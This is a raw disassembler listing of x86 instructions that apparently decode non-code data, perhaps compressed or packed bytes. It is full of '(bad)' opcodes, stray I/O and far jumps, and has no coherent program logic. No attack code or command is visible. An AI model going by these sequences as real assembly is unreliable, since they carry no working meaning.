  42ee5a:	sub    BYTE PTR [edx+0x1ea043df],bh
  42ee60:	add    ch,BYTE PTR [edx+edi*1-0x1b]
  42ee64:	lods   al,BYTE PTR ds:[esi]
  42ee65:	and    BYTE PTR [edx+0x66ada58a],cl
  42ee6b:	daa    
  42ee6c:	xchg   esp,eax
  42ee6d:	pop    ebp
  42ee6e:	int    0x43
  42ee70:	ss cdq 
  42ee72:	push   eax
  42ee73:	xor    esp,ebp
  42ee75:	adc    ecx,DWORD PTR [esi-0x4770f9af]
  42ee7b:	push   esp
  42ee7c:	je     0x42eee3
  42ee7e:	xchg   DWORD PTR [eax+0x7b],ebp
  42ee81:	cmp    ebx,esi
  42ee83:	sahf   
  42ee84:	les    ebx,FWORD PTR [esi+0x34027c67]
  42ee8a:	clc    
  42ee8b:	shl    BYTE PTR [edi-0x15393ec0],cl
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	inc    edi
  42ef01:	js     0x42eecd
  42ef03:	add    DWORD PTR [edi+esi*8+0x1],edi
  42ef07:	add    BYTE PTR ds:0x4b000001,al
  42ef0d:	or     BYTE PTR [edi+0x3f87de4b],bh
  42ef13:	rcr    BYTE PTR [edx-0x31],cl
  42ef16:	movaps xmm2,XMMWORD PTR [eax]
  42ef19:	aaa    
  42ef1a:	cmp    eax,0x5bcfa93f
  42ef1f:	cmp    al,0xc3
  42ef21:	sbb    dh,BYTE PTR [ebp-0x50]
  42ef24:	nop
  42ef25:	adc    al,0xe7
  42ef27:	stc    
  42ef28:	pop    eax
  42ef29:	dec    eax
  42ef2a:	or     dh,BYTE PTR [ebx]
  42ef2c:	dec    ebp
  42ef2d:	pop    esi
  42ef2e:	mov    ch,0xf4
  42ef30:	out    0x96,al
  42ef32:	jo     0x42ef86
  42ef34:	jne    0x42ef82
  42ef36:	rcr    DWORD PTR [ecx],0x6d
  42ef39:	aaa    
  42ef3a:	inc    edi
  42ef3b:	sbb    al,0xdb
  42ef3e:	push   cs
  42ef3f:	inc    eax
  42ef40:	in     al,dx
  42ef41:	sbb    ebx,edx
  42ef43:	add    DWORD PTR [ebp+0x7e979712],ecx
  42ef49:	ins    DWORD PTR es:[edi],dx
  42ef4a:	mov    ebx,ds
  42ef4c:	sbb    edx,esp
  42ef4e:	add    cl,BYTE PTR [eax+0x38f2b9e7]
  42ef54:	imul   esi,edx,0xffffffdc
  42ef57:	mov    edi,0x9fbb2309
  42ef5c:	mov    ah,0x97
  42ef5f:	or     al,0xc8
  42ef61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef62:	push   ss
  42ef63:	fdiv   QWORD PTR [eax+0x79b8ed99]
  42ef69:	and    edi,DWORD PTR [edi+0x2]
  42ef6c:	or     al,0xf7
  42ef6e:	icebp  
  42ef6f:	fild   DWORD PTR [ebp-0x7ee3c986]
  42ef75:	jb     0x42efe7
  42ef77:	sbb    dh,0xb2
  42ef7a:	mov    edx,0x9332c94b
  42ef7f:	dec    esp
  42ef80:	xor    eax,0xc3fabeea
  42ef85:	ret    
  42ef86:	or     eax,0x72501e0c
  42ef8b:	imul   eax,esp,0xfffffffb
  42ef8e:	test   dh,dl
  42ef90:	das    
  42ef91:	or     DWORD PTR [edx+0x391875a2],esi
  42ef97:	mov    al,ds:0xc8ab0eb5
  42ef9c:	cmp    bl,BYTE PTR [ecx]
  42ef9e:	fmul   QWORD PTR [ecx+0x48fef5f]
  42efa4:	ja     0x42ef97
  42efa6:	pop    eax
  42efa7:	dec    esp
  42efa8:	jb     0x42ef54
  42efaa:	xor    ebx,edx
  42efac:	fwait
  42efad:	pop    ecx
  42efae:	(bad)  
  42efaf:	bound  eax,QWORD PTR [ebx+0x6c]
  42efb2:	aaa    
  42efb3:	cld    
  42efb4:	fidiv  DWORD PTR [ebx-0x4d]
  42efb7:	fadd   st(2),st
  42efb9:	test   eax,0xbf9aa734
  42efbe:	mov    dl,0xec
  42efc0:	mov    esp,0x14481767
  42efc5:	sar    BYTE PTR [ebx+0x3178a390],1
  42efcb:	adc    DWORD PTR [ecx-0x2b],ebx
  42efce:	fidivr WORD PTR [eax+ecx*8+0x64]
  42efd2:	jmp    DWORD PTR [edi+0x56764b8c]
  42efd8:	lods   al,BYTE PTR ds:[esi]
  42efd9:	pusha  
  42efda:	xor    al,0x1d
  42efdc:	loopne 0x42f028
  42efde:	lock add DWORD PTR [ecx+0x7ee6f46c],0xffffff92
  42efe6:	mov    edx,0x719c0010
  42efeb:	xor    eax,0x4fb85161
  42eff0:	int3   
  42eff1:	xchg   ecx,eax
  42eff2:	(bad)  
  42eff3:	cs int3 
  42eff5:	ds add ecx,ebx
  42eff8:	(bad)  
  42eff9:	lock push esi
  42effb:	jo     0x42f07c
  42effd:	ins    BYTE PTR es:[edi],dx
  42effe:	fwait
  42efff:	iret   
  42f000:	rcr    esp,1
  42f002:	cmp    ah,BYTE PTR [edx]
  42f004:	loopne 0x42f030
  42f006:	xor    bl,BYTE PTR [ecx-0x32703e6e]
  42f00c:	test   eax,0xfbd114a5
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	call   0x1f8:0x813b42d0
  42f087:	add    BYTE PTR ds:0xe2000001,al
  42f08d:	test   bl,0x36
  42f090:	(bad)  
  42f091:	and    eax,0x4fb6b3da
  42f096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f097:	dec    edi
  42f098:	or     BYTE PTR [eax-0x23],bl
  42f09b:	push   edx
  42f09c:	mov    ds:0x27d1570a,eax
  42f0a1:	inc    ebx
  42f0a2:	pop    ebp
  42f0a3:	push   0xffffff82
  42f0a5:	adc    al,ch
  42f0a7:	sub    al,BYTE PTR [edi+eax*4-0x42]
  42f0ab:	dec    ebp
  42f0ac:	push   edi
  42f0ad:	sub    DWORD PTR ds:0x4c491dd7,esp
  42f0b3:	out    dx,eax
  42f0b4:	xor    BYTE PTR [ecx+esi*8],bl
  42f0b7:	(bad)
  42f0ba:	add    cl,BYTE PTR [eax+0x850a452]
  42f0c0:	mov    edi,0x2a34ee23
  42f0c5:	pop    eax
  42f0c6:	pcmpgtb mm6,QWORD PTR [esi-0x50b37196]
  42f0cd:	ins    DWORD PTR es:[edi],dx
  42f0ce:	aaa    
  42f0cf:	in     eax,dx
  42f0d0:	pop    eax
  42f0d1:	test   DWORD PTR [edx+esi*4],edi
  42f0d4:	sbb    dh,BYTE PTR [edx]
  42f0d6:	loopne 0x42f109
  42f0d8:	mov    ch,0x17
  42f0da:	jo     0x42f157
  42f0dc:	sub    bh,BYTE PTR es:[edx+0x62]
  42f0e0:	xchg   DWORD PTR [ebx],esp
  42f0e2:	add    eax,0x979fe273
  42f0e7:	add    eax,0xafb877c7
  42f0ec:	(bad)  
  42f0ed:	ds daa 
  42f0ef:	repz fsubrp st(7),st
  42f0f2:	and    BYTE PTR [ebx],cl
  42f0f4:	test   al,0xde
  42f0f6:	ja     0x42f163
  42f0f8:	sbb    edi,esp
  42f0fa:	nop
  42f0fb:	sbb    BYTE PTR [ebp-0x7f0c41e4],bl
  42f101:	fisubr DWORD PTR [ebx]
  42f103:	or     al,0xc5
  42f105:	or     eax,0xb2bd2a55
  42f10a:	add    ebp,DWORD PTR [edi+0x1d]
  42f10d:	jg     0x42f135
  42f10f:	mov    DWORD PTR [ebp-0x1b0c1de4],esp
  42f115:	add    al,0xfd
  42f117:	push   ebx
  42f118:	repz (bad) 
  42f11a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f11b:	(bad)  
  42f11d:	add    edi,edx
  42f11f:	scas   eax,DWORD PTR es:[edi]
  42f120:	ret    0x2944
  42f123:	ffree  st(4)
  42f125:	in     eax,0x42
  42f127:	dec    ebx
  42f128:	push   ss
  42f129:	repz xchg ebx,eax
  42f12b:	push   ebp
  42f12c:	sub    eax,0xbf53e91f
  42f131:	iret   
  42f132:	push   esi
  42f133:	xchg   BYTE PTR [ebx],ah
  42f135:	daa    
  42f136:	sbb    BYTE PTR [ebx-0x75aa3e08],cl
  42f13c:	out    dx,eax
  42f13d:	and    ebx,ebx
  42f13f:	mov    edx,0xeda1b0c6
  42f144:	add    DWORD PTR [ecx],0x5a11f129
  42f14a:	dec    ebx
  42f14b:	cmc    
  42f14c:	or     eax,0x4c9384d0
  42f151:	sahf   
  42f152:	out    0xa9,al
  42f154:	(bad)  
  42f155:	mov    eax,0x8c5a680e
  42f15a:	inc    eax
  42f15b:	sahf   
  42f15c:	push   esi
  42f15d:	sbb    esp,DWORD PTR [edx+edi*2-0x1d9d35e2]
  42f164:	push   esp
  42f165:	in     al,dx
  42f166:	aaa    
  42f167:	sbb    eax,0xe228f1a9
  42f16c:	shr    bh,0x1b
  42f16f:	sahf   
  42f170:	es stos BYTE PTR es:[edi],al
  42f172:	into   
  42f173:	rcr    DWORD PTR [ebp+0x202287d6],cl
  42f179:	and    eax,0x26d09aa9
  42f17e:	pop    edi
  42f17f:	add    eax,DWORD PTR [eax]
  42f181:	ins    DWORD PTR es:[edi],dx
  42f182:	ins    DWORD PTR es:[edi],dx
  42f183:	aas    
  42f184:	daa    
  42f185:	(bad)  
  42f187:	sub    bh,cl
  42f189:	jp     0x42f1c4
  42f18b:	(bad)  
  42f18c:	test   DWORD PTR [edx+0x16],esp
  42f18f:	jbe    0x42f1f1
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	mov    esp,0x86dd3fde
  42f205:	stc    
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xab000001
  42f20d:	sub    ecx,esp
  42f20f:	das    
  42f210:	xchg   ebx,eax
  42f211:	ror    BYTE PTR [ebx+edx*1],1
  42f214:	jmp    0x662f:0x38b084a7
  42f21b:	add    BYTE PTR [esi-0x35],0x1
  42f21f:	mov    al,0xa9
  42f221:	xor    dh,bh
  42f223:	mov    ecx,0x2cff9c4
  42f228:	cmp    ah,dh
  42f22a:	push   ecx
  42f22b:	jecxz  0x42f1e2
  42f22d:	(bad)  
  42f22e:	int3   
  42f22f:	sbb    eax,0xb8795c87
  42f234:	jl     0x42f1d0
  42f236:	and    al,0x10
  42f238:	iret   
  42f239:	sbb    eax,0x24da2686
  42f23e:	fisub  WORD PTR [ebp+0x7c124c59]
  42f244:	adc    BYTE PTR [edx+ebp*8],bl
  42f247:	add    edi,DWORD PTR [edx]
  42f249:	cmp    al,0x4c
  42f24b:	ret    0x6372
  42f24e:	loopne 0x42f1e0
  42f250:	(bad)  
  42f251:	pop    esi
  42f252:	inc    ebx
  42f253:	inc    edi
  42f254:	mov    WORD PTR [edx-0xde5a331],fs
  42f25a:	xor    DWORD PTR [ecx-0xa],edx
  42f25d:	and    esi,edx
  42f25f:	xchg   ecx,eax
  42f260:	stc    
  42f261:	pop    ebx
  42f262:	mov    WORD PTR [edi+0x42],fs
  42f265:	aas    
  42f266:	mov    al,ds:0x149a68ce
  42f26b:	push   edi
  42f26c:	pop    ss
  42f26d:	xchg   edx,eax
  42f26e:	push   esi
  42f26f:	pop    edx
  42f270:	or     eax,0xc1fb5a7d
  42f275:	out    0x3a,eax
  42f277:	inc    ecx
  42f278:	and    ecx,0x6f
  42f27b:	outs   dx,DWORD PTR ds:[esi]
  42f27c:	outs   dx,DWORD PTR ds:[esi]
  42f27d:	sbb    DWORD PTR [ecx-0x6ea66735],ebp
  42f283:	fiadd  WORD PTR [ebp-0x12338c64]
  42f289:	xchg   edx,eax
  42f28a:	pop    ebp
  42f28b:	(bad)  
  42f28c:	xor    eax,0x2baaadaf
  42f291:	mov    esi,0x8e6179aa
  42f296:	or     bl,BYTE PTR [ebp+0x44]
  42f299:	pop    ds
  42f29a:	ins    DWORD PTR es:[edi],dx
  42f29b:	scas   eax,DWORD PTR es:[edi]
  42f29c:	push   esp
  42f29d:	ins    BYTE PTR es:[edi],dx
  42f29e:	fsubrp st(0),st
  42f2a0:	add    ah,ah
  42f2a2:	jne    0x42f27f
  42f2a4:	dec    edi
  42f2a5:	mov    edx,0x5f58da1d
  42f2aa:	in     al,dx
  42f2ab:	ret    
  42f2ac:	ret    0x9159
  42f2af:	mov    eax,0x18d3d2db
  42f2b4:	xor    edx,DWORD PTR [esi+0x3b49f48d]
  42f2ba:	sub    eax,0x846c871a
  42f2bf:	ret    
  42f2c0:	cmp    esp,DWORD PTR [ebp+0x637795b0]
  42f2c6:	sbb    bl,BYTE PTR ds:0x4b3e7872
  42f2cc:	bound  esp,QWORD PTR [edx]
  42f2ce:	fs sbb bl,dh
  42f2d1:	outs   dx,DWORD PTR ds:[esi]
  42f2d2:	nop
  42f2d3:	loope  0x42f339
  42f2d5:	cmp    edx,DWORD PTR [ebp-0x6a23d34d]
  42f2db:	cli    
  42f2dc:	cmp    DWORD PTR [ebx-0x14],esi
  42f2df:	rol    BYTE PTR [esp+edi*1-0xf70398c],cl
  42f2e6:	test   ah,0x25
  42f2e9:	pop    edx
  42f2ea:	pop    ds
  42f2eb:	out    dx,eax
  42f2ec:	jmp    0x69ca:0xf3d52863
  42f2f3:	cdq    
  42f2f4:	cwde   
  42f2f5:	jnp    0x42f34e
  42f2f7:	mov    ebx,0x380d2afa
  42f2fc:	cs daa 
  42f2fe:	xchg   edi,eax
  42f2ff:	outs   dx,BYTE PTR ds:[esi]
  42f300:	mov    al,ds:0x99b343e4
  42f305:	(bad)  
  42f306:	push   ebp
  42f307:	xor    edi,DWORD PTR [ecx+0x2a]
  42f30a:	inc    edi
  42f30b:	(bad)  
  42f30c:	sub    DWORD PTR [edi+0xb3108c],ebx
	...
  42f372:	add    BYTE PTR [eax],al
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	ss clc 
  42f382:	pop    ebp
  42f383:	je     0x42f310
  42f385:	cli    
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x79000001
  42f38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f38e:	xchg   edx,eax
  42f38f:	js     0x42f406
  42f391:	adc    esi,DWORD PTR [edx]
  42f393:	mov    dl,0x40
  42f395:	ins    DWORD PTR es:[edi],dx
  42f396:	setle  dh
  42f399:	inc    edi
  42f39a:	mov    al,0x1d
  42f39c:	sub    ch,BYTE PTR [ebx]
  42f39e:	add    ebx,DWORD PTR [ebx+0x3a]
  42f3a1:	adc    dl,ch
  42f3a3:	mov    al,0x15
  42f3a5:	in     al,0xa2
  42f3a7:	push   eax
  42f3a8:	mov    ecx,0xe519720e
  42f3ad:	call   0x70de:0x64e95d67
  42f3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3b5:	mov    ds:0x53e818ae,al
  42f3ba:	sar    DWORD PTR ss:[esi+0x19],0xb4
  42f3bf:	sub    edi,DWORD PTR [ecx+0x469eb208]
  42f3c5:	out    0xfb,eax
  42f3c7:	pop    ebp
  42f3c8:	push   esi
  42f3c9:	mov    esp,0xa372d78a
  42f3ce:	fsub   QWORD PTR [ecx-0x11636a80]
  42f3d4:	push   esi
  42f3d5:	jg     0x42f35b
  42f3d7:	push   0xf6a81e25
  42f3dc:	fistp  DWORD PTR [esi+0x7e]
  42f3df:	sub    al,0x9d
  42f3e1:	mov    esi,0x8627055
  42f3e6:	rol    DWORD PTR [edi-0x365bfc33],1
  42f3ec:	test   ebx,eax
  42f3ee:	sbb    DWORD PTR [esi-0x7a],0x3b
  42f3f2:	pop    esp
  42f3f3:	dec    esp
  42f3f4:	shr    ebp,1
  42f3f6:	pop    es
  42f3f7:	mov    edx,0xbf064ed2
  42f3fc:	nop
  42f3fd:	(bad)  
  42f3fe:	mov    ebx,0x16d0e3ff
  42f403:	retf   
  42f404:	xor    BYTE PTR ds:0x7ab65966,cl
  42f40a:	adc    BYTE PTR [eax-0x5e41ef84],dh
  42f410:	xchg   DWORD PTR [eax],ecx
  42f412:	jl     0x42f43b
  42f414:	pop    esp
  42f415:	xchg   edx,eax
  42f416:	test   DWORD PTR [esi],ecx
  42f418:	jns    0x42f447
  42f41a:	cmp    DWORD PTR [esi],eax
  42f41c:	test   DWORD PTR [edi],ecx
  42f41e:	xlat   BYTE PTR ds:[ebx]
  42f41f:	sbb    bl,BYTE PTR ds:0x6742cfd2
  42f425:	inc    esi
  42f426:	mov    bh,0x2c
  42f428:	push   eax
  42f429:	xor    edi,esp
  42f42b:	mov    dl,0x9c
  42f42d:	fsub   QWORD PTR [edx+0xf3c00c2]
  42f433:	sbb    BYTE PTR [esi-0x69],dh
  42f436:	and    edx,edx
  42f438:	pop    ss
  42f439:	mov    edi,DWORD PTR ds:0x5778ea8e
  42f43f:	enter  0x6e12,0xe3
  42f443:	imul   ebx,DWORD PTR [esi+0x2177b166],0x69
  42f44a:	ss sub ebp,edx
  42f44d:	call   0x6e0ae135
  42f452:	imul   edi,DWORD PTR ds:0xdb27be30,0x6
  42f459:	fcomp  DWORD PTR [esi+ebx*4]
  42f45c:	pop    esp
  42f45d:	inc    ebp
  42f45e:	and    eax,0x7bfa5bb4
  42f463:	adc    eax,0x335d36cd
  42f468:	mov    al,ds:0x50279ece
  42f46d:	das    
  42f46e:	imul   edx,DWORD PTR [eax],0xffffffa9
  42f471:	ret    
  42f472:	jae    0x42f4a1
  42f474:	or     BYTE PTR [ebx-0x39fc081f],ah
  42f47a:	rol    BYTE PTR [edx+edi*2],0xd9
  42f47e:	push   esp
  42f47f:	push   cs
  42f480:	push   cs
  42f481:	mov    bh,0xed
  42f483:	sbb    al,0xad
  42f485:	jne    0x42f4d2
  42f487:	dec    esi
  42f488:	mov    edx,0x3ffed5c6
  42f48d:	xchg   ebp,eax
  42f48e:	out    0x13,eax
  42f490:	or     eax,DWORD PTR [eax]
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	dec    esp
  42f501:	sub    al,0x3e
  42f503:	(bad)  
  42f504:	nop
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x3a000001
  42f50d:	dec    ebx
  42f50e:	push   ebp
  42f50f:	mov    esi,esp
  42f511:	mov    ah,0xfe
  42f513:	cli    
  42f514:	xchg   edx,eax
  42f515:	leave  
  42f516:	add    eax,DWORD PTR [ebx-0x37d20bff]
  42f51c:	sbb    eax,0xdda59e53
  42f521:	ins    DWORD PTR es:[edi],dx
  42f522:	in     eax,dx
  42f523:	les    eax,FWORD PTR [ebx+esi*8-0x22817b5b]
  42f52a:	shr    DWORD PTR [eax],0x4e
  42f52d:	fidiv  WORD PTR [eax+0x74bb24d1]
  42f533:	cmp    dl,BYTE PTR [ebx+0xe]
  42f536:	pop    ss
  42f537:	dec    edx
  42f538:	jne    0x42f4bf
  42f53a:	pop    es
  42f53b:	iret   
  42f53c:	mov    es,WORD PTR [edi+0x6e72bcf4]
  42f542:	push   esi
  42f543:	in     eax,0x3f
  42f545:	dec    ecx
  42f546:	push   edx
  42f547:	jns    0x42f542
  42f549:	out    0x7f,al
  42f54b:	jb     0x42f547
  42f54d:	(bad)  
  42f54e:	rol    BYTE PTR [eax-0x742a90b5],1
  42f554:	xchg   DWORD PTR [esi],eax
  42f556:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f558:	imul   esi,DWORD PTR [ebx-0x2affe820],0x70af2b7e
  42f562:	xor    ecx,DWORD PTR [esi]
  42f564:	pop    esi
  42f565:	sbb    BYTE PTR [ebx+0x2be4171f],bh
  42f56b:	hlt    
  42f56c:	adc    eax,0xdcc36f5f
  42f571:	aaa    
  42f572:	mov    edi,ds
  42f574:	mov    BYTE PTR [edi-0x493f087e],cl
  42f57a:	mov    ah,0xd9
  42f57c:	(bad)  
  42f57d:	call   DWORD PTR [edx-0x39a0aeb8]
  42f583:	mov    cl,0xda
  42f585:	cs adc edx,DWORD PTR ds:[edi+ebp*1]
  42f58a:	mov    edx,0x17e202ee
  42f58f:	mov    WORD PTR [edi],?
  42f591:	pop    ds
  42f592:	mov    cl,0xd5
  42f594:	jge    0x42f521
  42f596:	xor    DWORD PTR [ebx+ecx*2+0x2],0x8cf50fc5
  42f59e:	ret    
  42f59f:	lods   eax,DWORD PTR ds:[esi]
  42f5a0:	test   DWORD PTR [edx],ecx
  42f5a2:	sahf   
  42f5a3:	ret    
  42f5a4:	cmp    al,bl
  42f5a6:	inc    ebx
  42f5a7:	inc    edi
  42f5a8:	add    DWORD PTR [ebp-0x71],esi
  42f5ab:	jbe    0x42f581
  42f5ad:	or     dl,dh
  42f5af:	adc    cl,BYTE PTR [esi-0x6a428917]
  42f5b5:	pop    es
  42f5b6:	pop    ebx
  42f5b7:	cmp    BYTE PTR [esi+0x5c],0x79
  42f5bb:	or     BYTE PTR [eax],0x5
  42f5be:	sahf   
  42f5bf:	push   edx
  42f5c0:	jae    0x42f55b
  42f5c2:	enter  0xfc36,0x61
  42f5c6:	sbb    al,BYTE PTR [ebx-0x48fbe6cd]
  42f5cc:	mov    ds:0x3b4dd4a5,eax
  42f5d1:	and    ebp,DWORD PTR [edx+edx*8-0x6756ca5e]
  42f5d8:	xlat   BYTE PTR ds:[ebx]
  42f5d9:	fimul  WORD PTR [eax-0x15]
  42f5dc:	icebp  
  42f5dd:	dec    ebx
  42f5de:	shld   ebp,ecx,cl
  42f5e1:	dec    edx
  42f5e2:	test   eax,0x82a0efaa
  42f5e7:	addr16 sbb edx,edi
  42f5ea:	inc    eax
  42f5eb:	push   esi
  42f5ec:	outs   dx,DWORD PTR cs:[esi]
  42f5ee:	push   0x40ae1934
  42f5f3:	call   0x284b3e0
  42f5f8:	addr16 js 0x42f65a
  42f5fb:	pop    ds
  42f5fc:	mov    ebx,0x88385185
  42f601:	repz in al,dx
  42f603:	pop    esi
  42f604:	jge    0x42f61c
  42f606:	lods   al,BYTE PTR ds:[esi]
  42f607:	pop    esp
  42f608:	ins    DWORD PTR es:[edi],dx
  42f609:	sub    DWORD PTR [ebx-0x250f483d],edi
  42f60f:	push   es
  42f610:	sbb    eax,0x0
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	mov    DWORD PTR [eax-0x36a8494],0x1050001
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	jns    0x42f655
  42f68e:	sbb    ch,BYTE PTR [edi+ebp*4]
  42f691:	add    BYTE PTR [edi+0x765397f4],cl
  42f697:	push   ss
  42f698:	test   eax,0x6c25ce08
  42f69d:	pop    ebx
  42f69e:	xor    al,0x22
  42f6a0:	iret   
  42f6a1:	call   0x759e781b
  42f6a6:	leave  
  42f6a7:	inc    ecx
  42f6a8:	lds    ebp,FWORD PTR [edi-0x5a]
  42f6ab:	push   0x8c2ddf4c
  42f6b0:	mul    edx
  42f6b2:	mov    ds,WORD PTR [ebx+0x636df432]
  42f6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6b9:	or     al,0x51
  42f6bb:	sahf   
  42f6bc:	repz ja 0x42f70e
  42f6bf:	fnstcw WORD PTR [esi+0x6aef3976]
  42f6c5:	cmp    DWORD PTR [ecx-0x23],esi
  42f6c8:	popa   
  42f6c9:	cwde   
  42f6ca:	jnp    0x42f659
  42f6cc:	cmp    eax,DWORD PTR [bx+di-0x78]
  42f6d0:	sub    BYTE PTR [edx+0x34],bl
  42f6d3:	sub    eax,0x17067cca
  42f6d8:	or     DWORD PTR [ebx+0x14013c1d],ebp
  42f6de:	cmp    edi,ebx
  42f6e0:	xlat   BYTE PTR ds:[ebx]
  42f6e1:	test   eax,0x3924eadb
  42f6e6:	jmp    0x42f723
  42f6e8:	ds pusha 
  42f6ea:	push   cs
  42f6eb:	dec    esi
  42f6ec:	xor    BYTE PTR [ebp+eax*1-0x99ad699],al
  42f6f3:	sub    eax,DWORD PTR [ecx]
  42f6f5:	dec    esp
  42f6f6:	add    dl,BYTE PTR [edx]
  42f6f8:	mov    ecx,0x420c8e1c
  42f6fd:	xlat   BYTE PTR ds:[ebx]
  42f6fe:	fstp   DWORD PTR [esp+esi*1]
  42f701:	jae    0x42f761
  42f703:	inc    esi
  42f704:	daa    
  42f705:	shl    BYTE PTR [ecx+esi*8-0x71],0xd4
  42f70a:	mov    WORD PTR [ebx-0x66faa5ee],es
  42f710:	xchg   edx,eax
  42f711:	sbb    eax,0xf793d7f2
  42f716:	push   cs
  42f717:	pop    ebx
  42f718:	fstp   DWORD PTR [ecx]
  42f71a:	push   ds
  42f71b:	push   esi
  42f71c:	push   ss
  42f71d:	mov    bl,0xc7
  42f71f:	and    esp,DWORD PTR ds:0x8ec11d67
  42f725:	or     BYTE PTR [eax-0x48],dl
  42f728:	pop    esi
  42f729:	jmp    0x24e5:0x6a6300ec
  42f730:	sti    
  42f731:	xchg   esp,eax
  42f732:	mov    esp,0x5a473270
  42f737:	daa    
  42f738:	popa   
  42f739:	out    dx,al
  42f73a:	xor    dl,dl
  42f73c:	cld    
  42f73d:	sbb    DWORD PTR [ecx-0x6a],esi
  42f740:	adc    DWORD PTR [eax+0x3cf138c7],edi
  42f746:	jmp    0xf6b12e65
  42f74b:	loope  0x42f7bc
  42f74d:	pop    ds
  42f74e:	dec    ebp
  42f74f:	and    BYTE PTR [esi],bl
  42f751:	test   BYTE PTR [edx+0x5574c1f1],bl
  42f757:	das    
  42f758:	(bad)  
  42f75a:	ins    DWORD PTR es:[edi],dx
  42f75b:	fist   WORD PTR [edx+edi*2]
  42f75e:	and    BYTE PTR [esp+edx*2+0x3934657d],bh
  42f765:	sbb    ecx,edx
  42f767:	popa   
  42f768:	xchg   ebx,eax
  42f769:	cmp    eax,0xbedb99e1
  42f76e:	jne    0x42f7ae
  42f770:	scas   al,BYTE PTR es:[edi]
  42f771:	call   0x476996cf
  42f776:	aad    0x63
  42f778:	jmp    0x42f7c5
  42f77a:	shl    ebp,1
  42f77c:	test   DWORD PTR [esi],edx
  42f77e:	dec    edi
  42f77f:	mov    al,0xb1
  42f781:	jl     0x42f735
  42f783:	fistp  DWORD PTR [esi-0x7d0ac3ca]
  42f789:	daa    
  42f78a:	jg     0x42f73b
  42f78c:	mov    bh,0xd4
  42f78e:	mov    ds:0xb047,eax
	...
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x29fed63
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [edx],ah
  42f80d:	cmp    edx,DWORD PTR [edx]
  42f80f:	xchg   esi,eax
  42f810:	sbb    al,0xf1
  42f812:	sti    
  42f813:	(bad)
  42f816:	dec    esi
  42f817:	repz push edi
  42f819:	jge    0x42f7a7
  42f81b:	push   cs
  42f81c:	jmp    0xba3657eb
  42f821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f822:	in     eax,0x82
  42f824:	and    bl,dl
  42f826:	mov    dl,0xc8
  42f828:	shl    BYTE PTR [ecx+0x3a],1
  42f82b:	adc    eax,0xaddaedb1
  42f830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f831:	loopne 0x42f890
  42f833:	pop    es
  42f834:	out    0x7a,al
  42f836:	xor    al,cl
  42f838:	sbb    edi,ecx
  42f83a:	ror    BYTE PTR [edx+edi*8-0x71],1
  42f83e:	add    BYTE PTR [eax-0x11],dh
  42f841:	shr    al,1
  42f843:	rcl    dl,1
  42f845:	fidiv  DWORD PTR [edx]
  42f847:	jmp    0x42f85a
  42f849:	jg     0x42f878
  42f84b:	jl     0x42f866
  42f84d:	loope  0x42f85f
  42f84f:	push   0xffffff96
  42f851:	popa   
  42f852:	dec    edi
  42f853:	and    al,0x2d
  42f855:	(bad)  
  42f856:	jecxz  0x42f828
  42f858:	mov    esi,0xa45d3c14
  42f85d:	lods   eax,DWORD PTR ds:[esi]
  42f85e:	test   al,0xec
  42f860:	stos   DWORD PTR es:[edi],eax
  42f861:	shl    BYTE PTR [esi+edi*2+0x33],0x3c
  42f866:	inc    esp
  42f867:	dec    ebx
  42f868:	std    
  42f869:	ins    DWORD PTR es:[edi],dx
  42f86a:	imul   esp,edx,0xffffffaf
  42f86d:	pop    ss
  42f86e:	repz fldenv [ecx-0x54]
  42f872:	lock mov al,ds:0x778ffb77
  42f878:	imul   edx,DWORD PTR [eax+0x92ad2f7],0xb42dcb94
  42f882:	iret   
  42f883:	mov    ecx,0xc37ce81f
  42f888:	dec    cl
  42f88a:	ja     0x42f859
  42f88c:	in     eax,dx
  42f88d:	jns    0x42f829
  42f88f:	inc    esi
  42f890:	adc    al,0x58
  42f893:	mov    ah,0x24
  42f895:	leave  
  42f896:	pop    esp
  42f897:	mov    edx,0xcda4bbc8
